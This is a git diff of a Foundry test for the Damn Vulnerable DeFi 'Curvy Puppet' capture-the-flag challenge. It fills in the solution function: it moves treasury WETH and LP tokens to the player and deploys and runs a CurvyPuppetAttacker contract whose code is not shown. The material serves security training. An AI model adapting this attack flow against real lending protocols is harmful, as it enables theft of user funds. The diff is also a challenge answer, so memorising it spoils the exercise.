@@ -9,6 +9,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {CurvyPuppetAttacker} from "./CurvyPuppetAttacker.sol";
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -76,7 +77,7 @@ contract CurvyPuppetChallenge is Test {
         deal(address(weth), treasury, TREASURY_WETH_BALANCE);
 
         // Fund lending pool and treasury with initial LP tokens
-        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
+        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:      
         IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
         IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);
 
@@ -158,7 +159,14 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, player, TREASURY_LP_BALANCE);
+        weth.withdraw(TREASURY_WETH_BALANCE);
+
+        CurvyPuppetAttacker attack =
+            new CurvyPuppetAttacker{value: TREASURY_WETH_BALANCE}(treasury, alice, bob, charlie, dvt, lending, oracle);
+        IERC20(curvePool.lp_token()).transfer(address(attack), TREASURY_LP_BALANCE);
+        attack.run();
     }
 
     /**
